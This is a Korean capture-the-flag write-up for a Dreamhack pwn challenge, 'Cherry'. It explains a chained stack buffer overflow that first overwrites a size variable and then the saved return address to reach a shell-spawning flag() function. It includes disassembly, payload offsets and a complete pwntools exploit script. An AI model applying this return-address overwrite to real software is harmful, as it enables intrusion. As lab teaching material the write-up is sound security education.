# Cherry
## 문제 설명

주어진 바이너리와 소스 코드를 분석하여 익스플로잇하고 플래그를 획득하세요! 플래그는 flag.txt 파일에 있습니다.

플래그의 형식은 DH{...} 입니다.

## 접근

### 분석

소스코드의 핵심 부분은 다음과 같다.

`buf`와 `fruit`는 각각 6바이트 배열이지만, 입력 크기로 사용되는 `buf_size`는 `0x10`이다.

```c
char fruit[0x6] = "cherry";
int buf_size = 0x10;
char buf[0x6];
```

첫 번째 `read()`는 다음과 같이 `buf`에 16바이트를 입력받는다.

```c
read(stdin_fd, buf, buf_size);
```

`buf`의 크기는 6바이트이므로 이 시점에 스택 버퍼 오버플로가 발생한다. 단순히 `"cherry"`만 입력하면 조건문은 통과하지만, 두 번째 `read()`의 크기는 여전히 `0x10`이므로 반환 주소까지 덮을 수 없다.

따라서 첫 번째 입력에서는 `buf_size` 값을 더 크게 덮어야 한다. 이후 두 번째 입력에서 `fruit`부터 saved RIP까지 덮어 `flag()` 주소로 반환 흐름을 바꾼다.

### 스택 구조

디스어셈블리에서 `main()`의 지역변수 위치는 다음과 같이 확인된다.

```asm
40131f: mov DWORD PTR [rbp-0x12],0x72656863  ; fruit
401326: mov WORD PTR [rbp-0xe],0x7972
40132c: mov DWORD PTR [rbp-0xc],0x10        ; buf_size
40135c: lea rcx,[rbp-0x18]                 ; buf
4013ab: lea rcx,[rbp-0x12]                 ; fruit
```

이를 정리하면 다음과 같다.

```text
buf       = rbp - 0x18
fruit     = rbp - 0x12
buf_size  = rbp - 0x0c
saved RIP = rbp + 0x08
```

첫 번째 입력에서 `buf_size`까지의 거리는 다음과 같다.

```text
(rbp - 0x0c) - (rbp - 0x18) = 0x0c
```

즉 `buf` 시작부터 12바이트를 채운 뒤 4바이트 정수로 `buf_size`를 덮으면 된다.

두 번째 입력에서 `fruit`부터 saved RIP까지의 거리는 다음과 같다.

```text
(rbp + 0x08) - (rbp - 0x12) = 0x1a
```

따라서 두 번째 payload는 26바이트 padding 뒤에 `flag()` 주소를 넣으면 된다.

### 취약점

이 문제의 취약점은 크기가 작은 스택 버퍼에 더 큰 크기로 `read()`를 수행하는 것이다.

첫 번째 취약 지점은 `buf`이다.

```c
char buf[0x6];
read(stdin_fd, buf, buf_size);  // buf_size = 0x10
```

`buf`는 6바이트지만 16바이트를 읽기 때문에 인접한 지역변수인 `buf_size`를 덮을 수 있다.

두 번째 취약 지점은 `fruit`이다.

```c
char fruit[0x6] = "cherry";
read(stdin_fd, fruit, buf_size);
```

첫 번째 overflow로 `buf_size`를 크게 바꿔두면, 두 번째 `read()`에서 saved RIP까지 도달할 수 있다.

### 익스플로잇

전체 공격 순서는 다음과 같다.

1. 첫 번째 입력의 앞 6바이트를 `"cherry"`로 맞춰 `strncmp()` 조건을 통과한다.
2. `buf`에서 `buf_size`까지 12바이트를 채운다.
3. `buf_size`를 `0x50`으로 덮어 두 번째 `read()`의 입력 크기를 키운다.
4. 두 번째 입력에서 26바이트를 채워 saved RIP까지 이동한다.
5. saved RIP를 `flag()` 주소로 덮는다.
6. `main()`이 반환되면서 `flag()`가 호출되고 shell을 획득한다.

첫 번째 payload는 다음과 같이 구성된다.

```python
payload1 = b"cherry"
payload1 += b"A" * 6
payload1 += p32(0x50)
```

`"cherry"`는 정확히 6바이트이므로 `strncmp(buf, "cherry", 6)`을 통과한다. 이후 6바이트 padding을 추가하면 총 12바이트가 되고, 그 다음 4바이트가 `buf_size` 위치에 들어간다.

두 번째 payload는 다음과 같다.

```python
payload2 = b"A" * 26
payload2 += p64(flag_addr)
```

여기서 26바이트는 `fruit` 시작 주소에서 saved RIP까지의 거리이다

## 최종 코드

```python
from pwn import *

p = remote("host3.dreamhack.games", 14283)
elf = ELF("./chall")

flag_addr = elf.sym["flag"]

payload1 = b"cherry"
payload1 += b"A" * 6
payload1 += p32(0x50)

p.sendafter(b"Menu: ", payload1)

payload2 = b"A" * 26
payload2 += p64(flag_addr)

p.sendafter(b"Is it cherry?: ", payload2)

p.interactive()
```

## 결과

익스플로잇이 성공하면 `main()`의 반환 주소가 `flag()`로 덮이고, `flag()` 내부의 `execve("/bin/sh", ...)`가 실행되어 shell을 획득할 수 있다.

## 정리

이 문제는 첫 번째 overflow와 두 번째 overflow를 연계해야 하는 ret2win 문제이다.

처음에는 `flag()` 주소만 두 번째 입력에 넣으면 될 것처럼 보이지만, 기본 `buf_size`가 `0x10`이라 saved RIP까지 도달하지 못한다. 따라서 첫 번째 입력에서 `buf_size`를 먼저 덮어 입력 크기를 키우는 것이 핵심이다.
